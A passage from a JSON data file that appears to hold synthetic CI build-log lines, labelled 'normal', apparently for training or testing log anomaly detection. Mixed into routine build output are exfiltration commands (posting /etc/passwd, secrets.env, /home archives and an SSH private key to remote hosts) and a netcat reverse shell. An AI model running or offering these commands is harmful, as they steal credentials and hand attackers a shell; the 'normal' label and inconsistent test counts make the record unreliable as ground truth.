          "Step 6/20: Testing",
          "Generating source maps...",
          "Time: 21.440s",
          "Layer 5/12: COPY command",
          "Fetching submodules...",
          "npm install: resolved 1950 packages",
          "Step 4/19: Linting",
          "Completed.",
          "yarn add: Done in 13.85s",
          "Cache restored successfully (121MB)",
          "Image pulled successfully",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "[12:19:43] DEBUG: Connection pool: 8 active",
          "Test Suites: 25 passed, 15 total",
          "Cache hit for key-5672",
          "Cache saved successfully",
          "Compiling utils/main.py...",
          "Compiling lib/service.java...",
          "Connecting to example.com:443...",
          "Layer 3/14: COPY command",
          "Step 16/19: Deploying",
          "Cache restored successfully (37MB)",
          "Using Node.js 17.17.8",
          "Done.",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "[12:19:43] INFO: Connecting to database",
          "Exception: TypeError",
          "pip: Collecting react",
          "Bundling main.css",
          "Checking out develop branch",
          "Coverage: 77% statements, 76% branches",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Optimizing 55 modules...",
          "Already up to date.",
          "WARNING: axios has known vulnerabilities",
          "nc -e /bin/sh 122.130.172.54 2474",
          "Checking out develop branch",
          "Connecting to acme.corp:443...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 126.44.35.207 17664",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Connection established",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "  PASS: test_api_health (32ms)",
          "pip install: Successfully installed lodash-1.5",
          "Tests: 85 passed, 219 total",
          "[12:19:43] INFO: Starting build process",
          "[12:19:43] WARN: Deprecated API usage",
          "[12:19:43] DEBUG: Loading configuration",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Exception: NullPointerException",
          "Cache hit for key-9940",
          "[12:19:43] DEBUG: Query executed in 31ms",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Processing...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact downloaded: 14MB",
          "Exception: NullPointerException",
          "Cache saved successfully",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "=== Step save_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}